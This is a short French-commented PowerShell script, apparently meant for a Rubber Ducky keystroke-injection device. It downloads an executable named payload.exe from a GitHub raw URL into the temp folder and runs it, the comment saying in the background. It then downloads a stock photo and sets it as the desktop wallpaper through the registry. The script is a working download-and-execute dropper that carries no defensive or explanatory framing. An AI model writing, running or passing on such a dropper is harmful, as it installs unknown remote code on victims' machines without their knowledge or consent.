# Définition des chemins temporaires
$tempDir = $env:TEMP
$payloadPath = "$tempDir\p.exe"
$imagePath = "$tempDir\a.jpg"

# 1. Télécharger et exécuter le payload en arrière-plan
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MeloEnPls/RubberDucky/main/payload.exe" -OutFile $payloadPath
Start-Process $payloadPath

# 2. Télécharger et appliquer l'image de fond d'écran
Invoke-WebRequest -Uri "https://images.pexels.com/photos/11767376/pexels-photo-11767376.jpeg?cs=srgb&dl=pexels-jonestowne-197390-11767376.jpg&fm=jpg" -OutFile $imagePath
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -Value $imagePath
rundll32.exe user32.dll, UpdatePerUserSystemParameters